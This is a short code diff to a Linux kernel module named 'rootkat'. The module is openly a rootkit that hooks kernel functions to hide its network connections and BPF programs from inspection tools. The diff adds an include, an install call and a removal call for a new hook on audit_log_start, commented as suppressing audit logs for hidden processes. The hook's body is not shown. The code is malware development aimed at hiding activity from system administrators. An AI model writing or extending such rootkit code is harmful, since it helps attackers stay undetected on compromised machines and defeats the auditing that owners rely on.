@@ -12,6 +12,7 @@
 #include "hook_udp_seq_show.h"
 #include "hook_inet_sk_diag_fill.h"
 #include "hook_sys_bpf.h"
+#include "hook_audit.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -89,12 +90,18 @@ static int __init rootkat_init(void)
 		pr_warn(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
 		        rc);
 
+	/* Non-fatal: audit log suppression for hidden PIDs. */
+	rc = rootkat_hook_audit_log_start_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_audit_log_start_remove();
 	rootkat_hook_sys_bpf_remove();
 	rootkat_hook_inet_sk_diag_fill_remove();
 	rootkat_hook_udp6_seq_show_remove();
